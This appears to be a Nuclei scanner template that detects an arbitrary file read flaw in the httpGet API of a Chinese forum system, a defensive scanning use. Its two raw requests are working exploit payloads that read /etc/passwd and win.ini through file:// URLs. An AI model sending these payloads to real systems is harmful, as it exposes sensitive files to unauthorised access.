id: duoke-httpGet-File-reading
info:
  name: "多客圈子论坛系统 httpGet 接口任意文件读取"
  author: Unknown
  severity: high
  description: |-
    body="/static/index/js/jweixin-1.2.0.js"
      多客圈子论坛系统在 /index.php/api/login/httpGet 接口处存在任意文件读取漏洞。攻击者可通过构造恶意请求绕过安全限制，读取系统敏感文件（如数据库配置文件、系统配置文件等），从而获取关键系统信息并可能导致进一步的安全风险。
  reference:
  - https://blog.csdn.net/m0_60571842/article/details/139546058
  tags: 多客圈子

http:
  - raw:
      - |
        GET /index.php/api/login/httpGet?url=file:///etc/passwd HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        words:
          - "root:x"
          - "/bin/bash"
        condition: and

  - raw:
      - |
        GET /index.php/api/login/httpGet?url=file://C:/windows/win.ini HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        part: body
        words:
          - "for 16-bit app support"